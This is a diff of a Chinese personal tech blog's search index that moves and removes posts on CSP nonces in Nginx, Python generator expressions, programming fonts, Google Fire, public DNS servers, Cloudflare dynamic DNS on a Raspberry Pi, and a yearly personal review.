-<li>接着通过Nginx的sub_filter NONCE_TOKEN ‘id’ 将页面中的NONCE_TOKEN占位符替换为id，或者使用lua进行替换</li>
-<li>最后使用<code>add_header Content-Security-Policy &quot;script-src &#39;nonce-{id}&#39;&quot;...</code> 添加对应的CSP返回头</li>
-</ul>
-<p>当然，为了避免攻击者提前注入一段脚本，并在script标签上同样添加了<code>nonce=&quot;NONCE_TOKEN&quot;</code>后端的“误”替换，导致这段提前注入的脚本进行执行。我们需要保密好项目的占位符，取一个特殊的占位符，并行动起来吧。</p>
+<p>为了解决此问题Python提供了生成器表达式（generator expression），它是对列表推导和生成器的一种泛化(generalization)。<strong>生成器表达式在运行的时候并不会把整个输出序列都呈现出来</strong>，而是会估值为迭代器(iterator)，这个迭代器每次可以根据生成器表达式产生一项数据。</p>
+<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>把实现列表推导式所用的写法放入一对圆括号中，就构成了生成器表达式。</p>
+<figure class="highlight Python"><table><tr><td class="code"><pre><code class="hljs Python">it = (len(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> open(<span class="hljs-string">'\file.txt'</span>))<br>print(it)<br>print(next(it))<br></code></pre></td></tr></table></figure>
+
+<h4 id="生成器表达式组合"><a href="#生成器表达式组合" class="headerlink" title="生成器表达式组合"></a>生成器表达式组合</h4><figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">it = (<span class="hljs-name">len</span>(<span class="hljs-name">x</span>) for x in open('\file.txt'))<br>roots = ((<span class="hljs-name">x</span>,x**0.<span class="hljs-number">5</span>) for x in it)<br>print(<span class="hljs-name">next</span>(<span class="hljs-name">roots</span>))<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>外围的迭代器每次前进时，都会推动内部的迭代器。</p>
+</blockquote>
+<p><strong>组合的表达式速度会很快</strong></p>
+<h3 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h3><p>生成器表达式求值时，它会立刻返回一个迭代器，而不会深入处理文件中的内容。</p>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -880,9 +1060,75 @@ return result</code></pre><p>print(merge_lists([4, 5, 6], [-2, -1, 0, 7]))<br>Ou
       </tags>
   </entry>
   <entry>
-    <title>decryption-javascript</title>
-    <url>/2021/02/25/decryption-javascript/</url>
-    <content><![CDATA[]]></content>
+    <title>编程代码字体</title>
+    <url>/2020/02/28/fonts-for-developers/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200228/l6USNNVGsDE8.gif" alt="mark"></p>
+<p>说到字体，之前看过西蒙·加菲尔德的《字体故事》非常不错的一本书，没有看过可以看看👉<a class="link"   href="https://yadi.sk/d/8osZAIkuBnQyZQ"  target="_blank" rel="noopener">字体故事<i class="fas fa-external-link-alt"></i></a>。字体真的是非常重要的基础设施。但凡是能够接触到信息除了口口相传，就一定能接触到字体。</p>
+<a id="more"></a>
+
+<p>最近不少大公司开始放出免费的为编程人员使用的字体，感谢。</p>
+<ol>
+<li>MS家专为新的终端程序设计的Cascadia Code.</li>
+<li>美国政府在U.S. Web Design System设计的Public Sans</li>
+<li>IBM为灵感设计的 IBM Plex</li>
+<li>Highway Gothic 为灵感设计的Overpass Font</li>
+<li>Jet Brains设计的Monospaced Font</li>
+</ol>
+<p>以上字体都可以免费使用，不用担心版权问题。</p>
+<ol>
+<li><p>MS Cascadia Code</p>
+<p>This is a fun, new monospaced font that includes programming ligatures and is designed to enhance the modern look and feel of the Windows Terminal.</p>
+<p><img src="https://github.com/microsoft/cascadia-code/raw/master/images/cascadia-code-characters.png" alt="MS Cascadia Code"></p>
+<p>Download👉<a class="link"   href="https://github.com/microsoft/cascadia-code/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>美国政府公布的原始码字形，修改自经典英文字体LibreFranklin Font的开源版本，比原有字体更清晰，对屏幕阅读有更好的易读性。</p>
+<p>Public Sans 提供各种字型厚度，font-weight 从100-900，包含italic，无论是标题还是内文都有非常好的表现。</p>
+<p><img src="http://imgs.yrzdm.com/imgs/20200228/F4PRCcXh26Vu.jpg?imageslim" alt="mark"></p>
+<p>download👉<a class="link"   href="https://github.com/uswds/public-sans/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>IBM Plex</p>
+<p>IBM Plex Family 由三大字体类型组成，Sans-serif，Serif和Mono，除了提供8中字重外，IBM Plex也提供了网页使用的eot woff, woff2格式</p>
+<p><img src="http://imgs.yrzdm.com/imgs/20200228/LfazgCU1Ni17.jpg?imageslim" alt="mark"></p>
+<p>官网👉<a class="link"   href="https://www.ibm.com/plex/"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
+<p>Download 👉<a class="link"   href="https://github.com/IBM/plex/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>Overpass Font</p>
+<p>Overpass设计灵感来自联邦高速公路字体，美国、加拿大、土耳其、澳大利亚、荷兰、中国都是使用联邦高速公路字体，不过现在部分地区已经使用Clearview替代。</p>
+<p><img src="http://imgs.yrzdm.com/imgs/20200228/z2prJYYF9xwP.gif" alt="mark"></p>
+<p><a class="link"   href="http://overpassfont.org/"  target="_blank" rel="noopener">官网地址<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>Monospaced Font</p>
+<p>JetBrains Mono 比一般的等宽字体来说<strong>增加了字体高度以提升阅读体验，更適合做变成代码使用</strong>，除了节省空间，也减少眼睛处理的时间。</p>
+<p><img src="http://imgs.yrzdm.com/imgs/20200228/GuEXUSUOG6Y9.jpg?imageslim" alt="mark"></p>
+<p>官网地址 👉<a class="link"   href="https://www.jetbrains.com/lp/mono/"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>google-fire.md</title>
+    <url>/2020/01/13/google-fire-md/</url>
+    <content><![CDATA[<p><a href="https://imgchr.com/i/l7asTx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/13/l7asTx.md.png" alt="l7asTx.md.png"></a><br>Python Fire is a library for automatically generating command line interfaces (CLIs) from absolutely any Python object.</p>
+<a id="more"></a>
+
+<p>fire 是Google开源的一个python库，能够以简单的方式生成CLI，使得使用REPL更加容易。</p>
+<ol>
+<li><strong>安装直接pypi库</strong><figure class="highlight cmake"><table><tr><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> fire<br></code></pre></td></tr></table></figure></li>
+<li><strong>使用函数</strong><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">import <span class="hljs-built_in">fire</span><br>def hello(<span class="hljs-built_in">name</span>=<span class="hljs-string">"world"</span>)<br>    return <span class="hljs-string">'Hello &#123;name&#125;!'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">name</span>=<span class="hljs-built_in">name</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-built_in">fire</span>.<span class="hljs-built_in">Fire</span>(hello)<br></code></pre></td></tr></table></figure>
+hello函数接收name参数，并有默认值”world”，使用fire.Fire(hello)即可简单快速的实现命令功能.<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$python</span> hello.py</span><br>Hello world!<br><span class="hljs-meta"><span class="hljs-meta-keyword">$python</span> hello.py --name=Roy</span><br>Hello roy!<br></code></pre></td></tr></table></figure></li>
+<li>Class的使用<br>fire支持类的调用方式。<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">import fire<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Calculator</span>(<span class="hljs-title">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">double</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,number)</span></span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*number<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">triple</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,number)</span></span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*number<br><br><span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">'__main__'</span>:<br>    fire.Fire(Calculator)<br></code></pre></td></tr></table></figure>
+使用方法<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">$python calculator.py <span class="hljs-built_in">double</span> <span class="hljs-number">10</span><br><span class="hljs-number">20</span><br>$python calculator.py triple --number=<span class="hljs-number">15</span><br><span class="hljs-number">45</span><br></code></pre></td></tr></table></figure>
+fire的使用非常简单，定义一个对象，剩下的交给fire来处理，it’s very pythonic.</li>
+</ol>
+]]></content>
       <categories>
         <category>docs</category>
         <category>python</category>
@@ -1062,233 +1308,6 @@ return result</code></pre><p>print(merge_lists([4, 5, 6], [-2, -1, 0, 7]))<br>Ou
       </tags>
   </entry>
   <entry>
-    <title>domain-name-servers</title>
-    <url>/2017/05/16/domain-name-servers/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/QvrbvunLMzT1.jpg?imageslim" alt="mark"></p>
-<h4 id="dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。"><a href="#dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。" class="headerlink" title="dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。"></a>dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。</h4><a id="more"></a>
-<p>以下常见问题可通过修改dns解决。<br>1.电脑只能上QQ，不能访问网页。<br>2.iphone手机访问appstore非常慢。<br>3.打开某网站速度非常慢。</p>
-<p><strong>DNSPod DNS+：★★★★★（推荐）</strong><br>DNSPod的 Public DNS+是目前国内第一家支持ECS的公共DNS，是DNSPod推出的公共域名解析服务，可以为全网用户提供域名的公共递归解析服务！<br>DNS 服务器 IP 地址：<br>首选：119.29.29.29<br>备选：182.254.116.116<br>作者点评：测试数据显示Public DNS+国内数据均比114DNS好，强力推荐！</p>
-<p><strong>114DNS：★★★★★</strong><br>国内用户量巨大的DNS，访问速度快，各省都有节点，同时满足电信、联通、移动各运营商用户，可以有效预防劫持。<br>DNS 服务器 IP 地址：<br>首选：114.114.114.114<br>备选：114.114.114.115<br>作者点评：虽然测试结果比不上Public DNS+理想，但是也是非常不错的DNS！</p>
-<p><strong>阿里 AliDNS：★★★★</strong><br>阿里公共DNS是阿里巴巴集团推出的DNS递归解析系统，目标是成为国内互联网基础设施的组成部分，面向互联网用户提供“快速”、“稳定”、“智能”的免费DNS递归解析服务。<br>DNS 服务器 IP 地址：<br>首选：223.5.5.5<br>备选：223.6.6.6<br>作者点评：排名第三的DNS也不是吹的，只是节点貌似有点少。</p>
-<p><strong>DNS派：★★★★</strong><br>DNS派是聚流科技旗下的DNS服务平台,为个人用户、网站主、企业提供各种有关DNS业务的服务,包括个人上网的域名解析服务、网站授权解析服务、企业域名解析服务等。<br>DNS 服务器 IP 地址：<br>首选（电信/移动/铁通）：101.226.4.6<br>备选（电信/移动/铁通）：218.30.118.6<br>首选（联通）：123.125.81.6<br>备选（联通）：140.207.198.6<br>作者点评：360出品！测试结果还不错！</p>
-<p><strong>百度 BaiduDNS：★★★</strong><br>百度DNS旗下云解析服务,依托百度一流基础设施和强大技术实力,为用户提供免费的、超越竞品的服务体验。没有套餐区分,安全,稳定,高效<br>DNS 服务器 IP 地址：<br>首选：180.76.76.76<br>作者点评：暂时不知道百度有多少节点。不过应该也不少吧。</p>
-<p><strong>CNNIC SDNS：★★★</strong><br>SDNS是由中国互联网络信息中心(CNNIC)正式推出的免费的公共云解析服务(SecureDNS,简称SDNS)。该服务可为广大网民提供安全、智能、高速的上网接入解析服务。<br>DNS 服务器 IP 地址：<br>首选：1.2.4.8<br>备选：210.2.4.8<br>作者点评：作为国家出品的DNS，有待测试……（你敢用吗？反正我不敢）</p>
-<p><strong>OpenDNS：★（不推荐）</strong><br>OpenDNS是一个免费的域名解析服务提供商（DNS）。创建于2006年，长期以来致力于为广大个人用户以及商务企业用户和公共领域提供免费的域名解析服务。<br>DNS 服务器 IP 地址：<br>首选：208.67.222.222<br>备选：208.67.220.220<br>作者点评：国内节点少！貌似就几个，不推荐使用！</p>
-<p><strong>Google DNS：★（强烈不推荐）</strong><br>谷歌公共域名解析服务（Google Public DNS）是由谷歌公司于2009年发布的一项新的DNS服务。主要为了替代ISPs或其他公司提供的DNS服务。<br>DNS 服务器 IP 地址：<br>首选：8.8.8.8<br>备选：8.8.4.4<br>作者点评：机房在国外，国内无节点！你如果用了谷歌DNS你的信息有可能会免费出国转一圈才回来！强烈不推荐使用！只适合国外用户使用！</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>collections</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>DNS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Use Cloudflare as Dynamic DNS with Raspberry Pi</title>
-    <url>/2020/01/20/dynamicDNS/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200120/ftOc2kD3gjA9.png?imageslim" alt="mark"><br>pi-hole、Domoticz、Homebridge都已经安装好了，是时候设置个域名了，考虑到Cloudflare的强大，此次的DDNS将使用Cloudflare来实现。</p>
-<a id="more"></a>
-<h3 id="Cloudflare-控制台配置"><a href="#Cloudflare-控制台配置" class="headerlink" title="Cloudflare 控制台配置"></a>Cloudflare 控制台配置</h3><p>1️⃣ 登录<a class="link"   href="https://dash.cloudflare.com/"  target="_blank" rel="noopener">cloudflare<i class="fas fa-external-link-alt"></i></a>控制台。</br><br>2️⃣ 添加你要进行解析的域名</br><br>3️⃣ 添加一条默认的A记录，指向一个ipv4的地址。</br></p>
-<h4 id="Global-API-Key"><a href="#Global-API-Key" class="headerlink" title="Global API Key"></a>Global API Key</h4><p>如果使用动态域名，需要使用全局apikey来登录更新A记录的值</p>
-<ol>
-<li>在CloudFlare管理后台登录个人面板</li>
-<li>向下滑动找到全局api</li>
-<li>记录下api后边使用</li>
-</ol>
-<h3 id="在树莓派上面配置"><a href="#在树莓派上面配置" class="headerlink" title="在树莓派上面配置"></a>在树莓派上面配置</h3><ol>
-<li>DDclient<br>⚠️ 安装完成后需要跳过设置界面，因为后面需要覆盖此配置。<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-keyword">get</span> install ddclient libjson-<span class="hljs-keyword">any</span>-perl<br></code></pre></td></tr></table></figure></li>
-<li>更新ddclient<br>最新版的ddclient能够更好的支持cloudflare<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">wget https:<span class="hljs-comment">//files.pimylifeup.com/portforwarding/ddclient-3.9.0.tar.gz</span><br>tar -zxvf ddclient<span class="hljs-number">-3.9</span><span class="hljs-number">.0</span>.tar.gz<br></code></pre></td></tr></table></figure></li>
-<li>替换已经安装的路径<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">sudo cp -f ddclient<span class="hljs-number">-3.9</span><span class="hljs-number">.0</span>/ddclient /usr/sbin/ddclient<br></code></pre></td></tr></table></figure></li>
-<li>因为新版的ddclient 做了更改，所以我们需要在原版基础上修改一下文件位置<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">sudo mkdir <span class="hljs-regexp">/etc/</span>ddclient<br>sudo mv <span class="hljs-regexp">/etc/</span>ddclient.conf <span class="hljs-regexp">/etc/</span>ddclient<br></code></pre></td></tr></table></figure></li>
-<li>修改配置文件<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/ddclient/ddclient.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure>
-将下列配置添加到文件当中<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">protocol</span>=cloudflare<br><span class="hljs-attribute">server</span>=www.cloudflare.com<br><span class="hljs-attribute">login</span>=CLONDFLARE_LOGIN_MAIL #此处填写你的cf登录邮箱<br><span class="hljs-attribute">password</span>=GLOBAL_API_KEY #此处填写上面拿到的cf密钥<br><span class="hljs-attribute">zone</span>=YOUR_DOMAIN.COM  #填写你的域名地址<br>anything.YOUR_DOMAIN.COM #配置的域名地址<br></code></pre></td></tr></table></figure></li>
-<li>重启服务<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/etc/i</span>nit.d<span class="hljs-regexp">/ddclient restart</span><br></code></pre></td></tr></table></figure>
-
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-        <category>Raspberry</category>
-        <category>Cloudflare</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>编程代码字体</title>
-    <url>/2020/02/28/fonts-for-developers/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200228/l6USNNVGsDE8.gif" alt="mark"></p>
-<p>说到字体，之前看过西蒙·加菲尔德的《字体故事》非常不错的一本书，没有看过可以看看👉<a class="link"   href="https://yadi.sk/d/8osZAIkuBnQyZQ"  target="_blank" rel="noopener">字体故事<i class="fas fa-external-link-alt"></i></a>。字体真的是非常重要的基础设施。但凡是能够接触到信息除了口口相传，就一定能接触到字体。</p>
-<a id="more"></a>
-
-<p>最近不少大公司开始放出免费的为编程人员使用的字体，感谢。</p>
-<ol>
-<li>MS家专为新的终端程序设计的Cascadia Code.</li>
-<li>美国政府在U.S. Web Design System设计的Public Sans</li>
-<li>IBM为灵感设计的 IBM Plex</li>
-<li>Highway Gothic 为灵感设计的Overpass Font</li>
-<li>Jet Brains设计的Monospaced Font</li>
-</ol>
-<p>以上字体都可以免费使用，不用担心版权问题。</p>
-<ol>
-<li><p>MS Cascadia Code</p>
-<p>This is a fun, new monospaced font that includes programming ligatures and is designed to enhance the modern look and feel of the Windows Terminal.</p>
-<p><img src="https://github.com/microsoft/cascadia-code/raw/master/images/cascadia-code-characters.png" alt="MS Cascadia Code"></p>
-<p>Download👉<a class="link"   href="https://github.com/microsoft/cascadia-code/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>美国政府公布的原始码字形，修改自经典英文字体LibreFranklin Font的开源版本，比原有字体更清晰，对屏幕阅读有更好的易读性。</p>
-<p>Public Sans 提供各种字型厚度，font-weight 从100-900，包含italic，无论是标题还是内文都有非常好的表现。</p>
-<p><img src="http://imgs.yrzdm.com/imgs/20200228/F4PRCcXh26Vu.jpg?imageslim" alt="mark"></p>
-<p>download👉<a class="link"   href="https://github.com/uswds/public-sans/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>IBM Plex</p>
-<p>IBM Plex Family 由三大字体类型组成，Sans-serif，Serif和Mono，除了提供8中字重外，IBM Plex也提供了网页使用的eot woff, woff2格式</p>
-<p><img src="http://imgs.yrzdm.com/imgs/20200228/LfazgCU1Ni17.jpg?imageslim" alt="mark"></p>
-<p>官网👉<a class="link"   href="https://www.ibm.com/plex/"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
-<p>Download 👉<a class="link"   href="https://github.com/IBM/plex/releases"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>Overpass Font</p>
-<p>Overpass设计灵感来自联邦高速公路字体，美国、加拿大、土耳其、澳大利亚、荷兰、中国都是使用联邦高速公路字体，不过现在部分地区已经使用Clearview替代。</p>
-<p><img src="http://imgs.yrzdm.com/imgs/20200228/z2prJYYF9xwP.gif" alt="mark"></p>
-<p><a class="link"   href="http://overpassfont.org/"  target="_blank" rel="noopener">官网地址<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>Monospaced Font</p>
-<p>JetBrains Mono 比一般的等宽字体来说<strong>增加了字体高度以提升阅读体验，更適合做变成代码使用</strong>，除了节省空间，也减少眼睛处理的时间。</p>
-<p><img src="http://imgs.yrzdm.com/imgs/20200228/GuEXUSUOG6Y9.jpg?imageslim" alt="mark"></p>
-<p>官网地址 👉<a class="link"   href="https://www.jetbrains.com/lp/mono/"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用生成器表达式来改写数据量比较大列表推导</title>
-    <url>/2020/04/17/generator-expression/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200417/JixsvvVoQCNj.png?imageslim" alt="generator expression"></p>
-<blockquote>
-<p>列表推导的缺点是：在推导过程中，对于输入序列的每个值都要创建仅含一项元素的全新列表。如果数据量较大会消耗大量内存，导致程序崩溃。</p>
-</blockquote>
-<a id="more"></a>
-
-<h3 id="推导代码："><a href="#推导代码：" class="headerlink" title="推导代码："></a>推导代码：</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">value = [len(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> open(<span class="hljs-string">'\file.txt'</span>)]<br>print(value)<br></code></pre></td></tr></table></figure>
-
-<p>为了解决此问题Python提供了生成器表达式（generator expression），它是对列表推导和生成器的一种泛化(generalization)。<strong>生成器表达式在运行的时候并不会把整个输出序列都呈现出来</strong>，而是会估值为迭代器(iterator)，这个迭代器每次可以根据生成器表达式产生一项数据。</p>
-<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>把实现列表推导式所用的写法放入一对圆括号中，就构成了生成器表达式。</p>
-<figure class="highlight Python"><table><tr><td class="code"><pre><code class="hljs Python">it = (len(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> open(<span class="hljs-string">'\file.txt'</span>))<br>print(it)<br>print(next(it))<br></code></pre></td></tr></table></figure>
-
-<h4 id="生成器表达式组合"><a href="#生成器表达式组合" class="headerlink" title="生成器表达式组合"></a>生成器表达式组合</h4><figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">it = (<span class="hljs-name">len</span>(<span class="hljs-name">x</span>) for x in open('\file.txt'))<br>roots = ((<span class="hljs-name">x</span>,x**0.<span class="hljs-number">5</span>) for x in it)<br>print(<span class="hljs-name">next</span>(<span class="hljs-name">roots</span>))<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>外围的迭代器每次前进时，都会推动内部的迭代器。</p>
-</blockquote>
-<p><strong>组合的表达式速度会很快</strong></p>
-<h3 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h3><p>生成器表达式求值时，它会立刻返回一个迭代器，而不会深入处理文件中的内容。</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2020总结及2021年展望</title>
-    <url>/2021/02/04/flags-2021/</url>
-    <content><![CDATA[<p>2020总结及2021年展望</p>
-<p>Funny things😜</p>
-<ol>
-<li>张大妈粉丝突破一千。<br><img src="https://images.yrzdm.com/imgs/20210204/JE0T2dMfjobI.jpg" alt="张大妈"></li>
-<li>成为湖北宜昌移动的合作伙伴，帮助湖北异常移动公司开发了多个内部应用。<br><img src="https://images.yrzdm.com/imgs/20210204/NResalwfp4O7.jpg?imageslim" alt="湖北移动-宜昌分公司"></li>
-<li>兼职，为在校学生设计svm分类器作业，物体识别训练的作业。以及多个商业爬虫项目的制作。</li>
-<li>参与开源项目的翻译repo</li>
-<li>为AntV G2提交repo</li>
-</ol>
-<p>Physical condition</p>
-<ol>
-<li>Pushups 100 计划未执行，未持续执行。❌</li>
-<li>宋健民的速效感冒灵的使用，未执行。❌</li>
-<li>哑铃肌肉锻炼，未持续执行。❌</li>
-<li>负重深蹲联系，未持续执行。❌</li>
-</ol>
-<p>Books 📓</p>
-<ol>
-<li><p>你当像鸟飞往你的山</p>
-</li>
-<li><p>C++编程思想</p>
-</li>
-<li><p>Python面试题汇总</p>
-</li>
-<li><p>Java编程思想</p>
-</li>
-<li><p>刑法学讲义</p>
-</li>
-<li><p>子弹笔记</p>
-</li>
-<li><p>蛊惑世界的力量</p>
-<p>忍不住骂自己，书看的还是太太太少…这特么一年都干了些啥。😡 生气</p>
-</li>
-</ol>
-<p>ToDO 2021</p>
-<p>[] 考研</p>
-<p>[] 带宝去皮肤病医院</p>
-<p>[] 车辆刹车油更换，车轮X换位。</p>
-<p>[] 外出旅行一次</p>
-<p>[] 张大妈破w粉，成为生活家</p>
-<p>[] 如果时间允许，体验顺丰快递员，体验兼职司机。</p>
-<p>[] 关于宝成长教育的思考，实践</p>
-<p>[] 储藏室创业项目的启动</p>
-<p>[]  健身计划</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>flag</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Flag</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>google-fire.md</title>
-    <url>/2020/01/13/google-fire-md/</url>
-    <content><![CDATA[<p><a href="https://imgchr.com/i/l7asTx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/13/l7asTx.md.png" alt="l7asTx.md.png"></a><br>Python Fire is a library for automatically generating command line interfaces (CLIs) from absolutely any Python object.</p>
-<a id="more"></a>
-
-<p>fire 是Google开源的一个python库，能够以简单的方式生成CLI，使得使用REPL更加容易。</p>
-<ol>
-<li><strong>安装直接pypi库</strong><figure class="highlight cmake"><table><tr><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> fire<br></code></pre></td></tr></table></figure></li>
-<li><strong>使用函数</strong><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">import <span class="hljs-built_in">fire</span><br>def hello(<span class="hljs-built_in">name</span>=<span class="hljs-string">"world"</span>)<br>    return <span class="hljs-string">'Hello &#123;name&#125;!'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">name</span>=<span class="hljs-built_in">name</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-built_in">fire</span>.<span class="hljs-built_in">Fire</span>(hello)<br></code></pre></td></tr></table></figure>
-hello函数接收name参数，并有默认值”world”，使用fire.Fire(hello)即可简单快速的实现命令功能.<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$python</span> hello.py</span><br>Hello world!<br><span class="hljs-meta"><span class="hljs-meta-keyword">$python</span> hello.py --name=Roy</span><br>Hello roy!<br></code></pre></td></tr></table></figure></li>
-<li>Class的使用<br>fire支持类的调用方式。<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">import fire<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Calculator</span>(<span class="hljs-title">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">double</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,number)</span></span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*number<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">triple</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,number)</span></span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*number<br><br><span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">'__main__'</span>:<br>    fire.Fire(Calculator)<br></code></pre></td></tr></table></figure>
-使用方法<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">$python calculator.py <span class="hljs-built_in">double</span> <span class="hljs-number">10</span><br><span class="hljs-number">20</span><br>$python calculator.py triple --number=<span class="hljs-number">15</span><br><span class="hljs-number">45</span><br></code></pre></td></tr></table></figure>
-fire的使用非常简单，定义一个对象，剩下的交给fire来处理，it’s very pythonic.</li>
-</ol>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>github访问图片加载优化</title>
     <url>/2021/01/29/github-access-optimization/</url>
     <content><![CDATA[<p>有时会碰到GitHub页面的图片无法正常显示的问题，都1202年了，还有受这种问题的困扰，非常难受。<br>根本原因应该是DNS解析的问题。</p>
@@ -1308,98 +1327,6 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
